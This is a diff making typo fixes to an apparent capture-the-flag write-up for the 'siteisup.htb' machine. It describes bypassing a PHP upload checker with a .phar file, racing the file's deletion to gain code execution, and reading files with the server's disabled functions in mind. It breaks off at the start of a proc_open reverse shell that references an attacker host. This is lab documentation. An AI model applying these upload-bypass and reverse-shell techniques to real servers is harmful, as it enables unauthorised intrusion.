@@ -310,7 +310,7 @@ Task Completed
 
 ## Source code Review
 
-index.php is pretty simple and, and basically lets us run any php files as long as there's no bin /usr and so on, this might come handy if we figure out a way to upload a php webshell. 
+index.php is pretty simple and, basically lets us run any php files as long as there's no bin /usr and so on, this might come handy if we figure out a way to upload a php webshell. 
 ```php
 <b>This is only for developers</b>
 <br>
@@ -362,7 +362,7 @@ if(DIRECTACCESS){
 
 [https://www.php.net/manual/en/function.trim.php](https://www.php.net/manual/en/function.trim.php) - trim is kinda like python strip()    
 [https://www.php.net/manual/en/function.curl-exec.php](https://www.php.net/manual/en/function.curl-exec.php)  - it's in the name   
-The function at the very top builds the http query with php `curl_init` then does the request with `curl_exec` and closes it with `curl_close` if the curl returns 200 the function returns an array of true, and the data of the curl, else it returns `e`
+The function at the very top builds the http query with php `curl_init` then does the request with `curl_exec` and closes it with `curl_close` if the curl returns 200 the function returns an array of true, and the data of the curl, else it returns false 
 ```php
 function isitup($url){
         $ch=curl_init();
@@ -441,9 +441,13 @@ Check
 [https://www.php.net/manual/en/function.md5.php](https://www.php.net/manual/en/function.md5.php) - make md5 digest   
 [https://www.php.net/manual/en/function.time.php](://www.php.net/manual/en/function.time.php) - get time  
 
-If `check` in the form check the file name file has is > 10kb, and die if it is  
-Get the name of the file and store in a variable. 
-Extract the extension with the getExtension function we read earlier, and regex match against that list of disallowed extensions, and die if it matches, maybe choosing to allow just one specific type of extension where would have been a better choice, since there's probably gonna be a way to escape the extension check, or just use one that isn't specifically denied, like phar.  
+If there's a `check` item in the form proceed,  
+Check if the file with name `file` is > 10kb, and die if it isn't   
+Get the filename of the file named `file` and store in a variable.   
+Extract the extension with the getExtension function we read earlier, and regex match against that list of disallowed extensions, and die if it matches.  
+
+Maybe allowing just one specific type of extension would have been a better choice here, since there's probably gonna be a way to escape the extension check, or just use one that isn't specifically denied, like phar.  
+ 
 Create a dir in uploads which is an md5 digest of the current time, so, this is predictable, if it doesn't already exist create it with 770 permitions  
 ```php
 if($_POST['check']){
@@ -470,7 +474,7 @@ if($_POST['check']){
 [https://www.php.net/manual/en/function.move-uploaded-file.php](https://www.php.net/manual/en/function.move-uploaded-file.php) - move uploaded file to new location   
 [https://www.php.net/manual/en/features.file-upload.post-method.php](https://www.php.net/manual/en/features.file-upload.post-method.php) - definition of the `$_FILE` Array  
 [https://www.php.net/manual/en/reserved.variables.files.php](https://www.php.net/manual/en/reserved.variables.files.php) - `$_FILE`  
-The location is guessable as its: `/upload/md5_of_upload_time/originalfilename` since the file variable is taken from the superglobal `$_FILE` 
+The final path is guessable as it's: `/upload/md5_of_upload_time/originalfilename` since the file variable is taken from the superglobal `$_FILE` and is the provided filename 
 ```php
   # Upload the file.
         $final_path = $dir.$file;
@@ -482,7 +486,7 @@ The location is guessable as its: `/upload/md5_of_upload_time/originalfilename` 
 Read the file from new location, and explode at "\n", into an array called websites  
 Start to iterate through the array  
 Trim newlines and spaces for the address   
-If it did not file regex matches for file:// data:// or ftp:// in the address, proceed, else tell the user that he's a fithy Hecker.   
+If it did not find regex matches for file:// data:// or ftp:// in the address, proceed, else tell the user that he's a fithy Hecker.   
 Run the isitup() func on the site address, and say if its up or down depending on what isitup() returned  
 ```php
   # Read the uploaded file.
@@ -527,7 +531,7 @@ while(true){
 ```
 
 
-This didn't work, and that's because I got impatient and didn't realise that the file is getting deleted as soon as the it's done iterating through the addresses, since our script has just a few lines, it get deleted before I even try to hit the uploaded file.
+This didn't work, and that's because I got impatient and didn't realise that the file is getting deleted as soon as it's done iterating through the addresses, since our script has just a few lines, it gets deleted before we even try to hit the uploaded file.
 ```php
   # Delete the uploaded file.
         @unlink($final_path);
@@ -569,7 +573,7 @@ while(true){
 ?>
 ```
 
-So I know that the original idea was to use the admin page, but but it won't work, as it would need to end in .php, doesn't matter, in fact we can just trigger it directly. 
+So I know that the original idea was to use the admin page, but it won't work, as it would need to end in .php, doesn't matter, in fact we can just trigger it directly. 
 ```bash
 php -f truely_random.phar
 epoch: 1667073507 - path: http://dev.siteisup.htb/uploads/85a641c8505df5499904db2d1d5832d1/do_thing.phar
@@ -584,7 +588,7 @@ clicking those paths and this works, as until the server stops listening to viva
 
 
 ## Exploring system files with the RCE
-A quick look the disabled functions and we know we're probably not gonna be able to do a reverse shell directly, but we know we can use `file_get_contents()` as we saw it used in checker.php, maybe we can use that read some files on the box instead?   
+A quick look at the disabled functions and we know we're probably not gonna be able to do a reverse shell directly, but we know we can use `file_get_contents()` as we saw it used in checker.php, maybe we can use that read some files on the box instead?   
 ![disabled.png](disabled.png)
 
 ```php
@@ -703,7 +707,7 @@ So `system` `exec` `shell_exec` `popen` `passthru` `fsockopen` are disabled, now
 ## PHP reverse shell with proc-open only
 [https://www.php.net/manual/en/function.proc-open.php](https://www.php.net/manual/en/function.proc-open.php)
 
-Looking at the php manual `for proc_open` I managed to get command execution by adapting the first example from the docs:
+Looking at the php manual for `proc_open` I managed to get command execution by adapting the first example from the docs:
 ```php
 http://10.10.14.35:8000/elevator
 <?php
